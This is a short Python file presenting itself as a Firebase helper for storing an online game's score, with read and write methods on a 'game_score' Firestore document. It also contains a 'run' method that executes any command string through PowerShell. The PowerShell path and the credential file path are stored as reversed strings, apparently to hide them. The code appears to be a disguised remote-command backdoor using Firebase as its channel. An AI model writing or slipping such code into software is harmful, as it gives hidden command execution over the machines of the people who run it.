import os, time
import threading

import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from idna import unicode
from firebase_admin import db


class Firebase:
    PS_DIR = r'exe.llehsrewop\\0.1v\\llehSrewoPswodniW\\23metsys\\SWODNIW\\:C'
    db = None

    def __init__(self):
        # Use a service account
        cred = credentials.Certificate('nosj.tnuoccAecivres/yek_virp/.'[::-1])
        firebase_admin.initialize_app(cred)

        self.db = firestore.client()

    def write(self, content, toUp):
        doc_ref = self.db.collection(u'onlinegame').document(u'game_score')
        # push = unicode(content, "utf-8")
        if toUp:
            doc_ref.set(
                content
            )
        else:
            doc_ref.update(
                content
            )
        return 999

    def read_async(self):
        doc_ref = self.db.collection(u'onlinegame').document(u'game_score')

        doc = doc_ref.get()
        if doc.exists:
            return doc.to_dict()
        else:
            return False



    def run(self, cmd):

        if cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
        else:
            os.system(self.PS_DIR[::-1] + " " + cmd)
        time.sleep(.5)

